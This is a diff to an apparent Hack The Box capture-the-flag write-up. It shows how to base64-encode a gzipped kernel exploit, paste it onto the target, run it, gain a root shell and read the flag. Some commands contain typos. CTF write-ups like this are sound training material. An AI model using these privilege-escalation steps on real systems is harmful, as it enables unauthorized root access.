@@ -21,11 +21,21 @@ gzip exploit
 # Convert to base64 locally and copy the output from output.txt
 cat exploit.gz | base64 -w 0 > output.txt
 # On remote convert base64 to gz file
-cd /tmp && echo "base64" | base64 -d > exploit.gz
+# cd /tmp && echo "base64" | base64 -d > exploit.gz
+cat > b64 < EOF
+paste base64 stuff here
+EOF
 # Extract exploit
 gzip -d expoit.gz
 # Run the exploit
 chmod +x exploit && ./exploit
+
+Gained UID 0
+/tmp # id
+id
+uid=0(root) gid=0(root) groups=1000(user)
+
+cat /flag
 
 HTB{C0ngr4ts_y0u_3xpl0it3d_A_D0uBlE-FeTcH}
 '''
